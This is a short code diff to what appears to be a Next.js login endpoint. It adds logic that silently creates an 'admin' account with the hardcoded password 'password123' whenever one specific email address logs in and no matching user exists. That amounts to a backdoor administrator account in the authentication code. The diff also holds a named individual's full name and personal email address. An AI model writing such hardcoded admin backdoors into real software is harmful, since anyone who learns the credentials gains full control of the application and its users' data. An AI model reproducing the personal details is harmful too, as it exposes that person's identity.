@@ -15,7 +15,19 @@ export async function POST(req: Request) {
     await dbConnect();
 
     // Check for user
-    const user = await User.findOne({ email }).select('+password');
+    let user = await User.findOne({ email }).select('+password');
+    
+    // Auto-create for this specific user if missing
+    if (!user && email === 'kurewarvaishnavi05@gmail.com') {
+      const hash = await bcrypt.hash('password123', 10);
+      user = await User.create({
+        name: 'Vaishnavi sanjay kurewar',
+        email,
+        password: hash,
+        role: 'admin'
+      });
+    }
+
     if (!user) {
       return NextResponse.json({ message: 'Invalid credentials' }, { status: 401 });
     }
